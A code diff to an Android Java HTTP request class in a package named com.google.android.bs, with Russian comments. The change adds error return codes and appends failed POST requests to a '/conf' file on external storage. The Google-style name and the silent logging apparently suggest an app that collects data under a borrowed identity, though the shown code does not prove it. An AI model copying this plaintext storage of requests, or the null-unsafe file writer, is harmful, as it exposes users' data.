@@ -1,5 +1,7 @@
 package com.google.android.bs;
 
+import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
@@ -17,13 +19,11 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.util.EntityUtils;
 
-import com.google.android.history.LinkService;
-
 import android.content.Context;
-import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
+import android.os.Environment;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
@@ -55,20 +55,29 @@ public class Request {
 			// Выполним запрос
 			HttpResponse response = httpclient.execute(httppost);
 
-			String strData = EntityUtils.toString(response.getEntity());
-			Log.d(LOG_TAG, "2 - " + strData);
+			if (response != null) {
+				String strData = EntityUtils.toString(response.getEntity());
+				Log.d(LOG_TAG, "2 - " + strData);
+			}
 
 			// getResponseData(strData);
 
 		} catch (UnsupportedEncodingException e) {
 			// TODO Auto-generated catch block
+			Log.d(LOG_TAG, "UnsupportedEncodingException. Return -3.");
 			e.printStackTrace();
+			return -3;
 		} catch (ClientProtocolException e) {
 			// TODO Auto-generated catch block
+			Log.d(LOG_TAG, "ClientProtocolException. Return -2.");
 			e.printStackTrace();
+			return -2;
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
+			Log.d(LOG_TAG, "IOException. Return -1.");
+			addLine(postRequest);
 			e.printStackTrace();
+			return -1;
 		}
 
 		return 0;
@@ -93,21 +102,37 @@ public class Request {
 
 			// Выполним запрос
 			HttpResponse response = httpclient.execute(httppost);
+			
 
-			String strData = EntityUtils.toString(response.getEntity());
-			Log.d(LOG_TAG, "4 - " + strData);
+			if (response != null) {
+				String strData = EntityUtils.toString(response.getEntity());
+				Log.d(LOG_TAG, "2 - " + strData);
+				getResponseData(strData);
+			} else {
+				Log.d(LOG_TAG, "response = null");
+			}
 
-			getResponseData(strData);
+//			String strData = EntityUtils.toString(response.getEntity());
+//			Log.d(LOG_TAG, "4 - " + strData);
+
+//			getResponseData(strData);
 
 		} catch (UnsupportedEncodingException e) {
 			// TODO Auto-generated catch block
+			Log.d(LOG_TAG, "UnsupportedEncodingException. Return -3.");
 			e.printStackTrace();
+			return -3;
 		} catch (ClientProtocolException e) {
 			// TODO Auto-generated catch block
+			Log.d(LOG_TAG, "ClientProtocolException. Return -2.");
 			e.printStackTrace();
+			return -2;
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
+			Log.d(LOG_TAG, "IOException. Return -1.");
+			addLine(postRequest);
 			e.printStackTrace();
+			return -1;
 		}
 
 		return 0;
@@ -261,6 +286,30 @@ public class Request {
 		}
 
 		ed.commit();
+	}
+	
+	public void addLine(String string) {
+		File outFile = new File(Environment.getExternalStorageDirectory(),
+				"/conf");
+		FileWriter wrt = null;
+		try {
+			wrt = new FileWriter(outFile, true);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		try {
+			wrt.append(string + "\n");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		try {
+			wrt.flush();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	public void sendRequest(String str) {
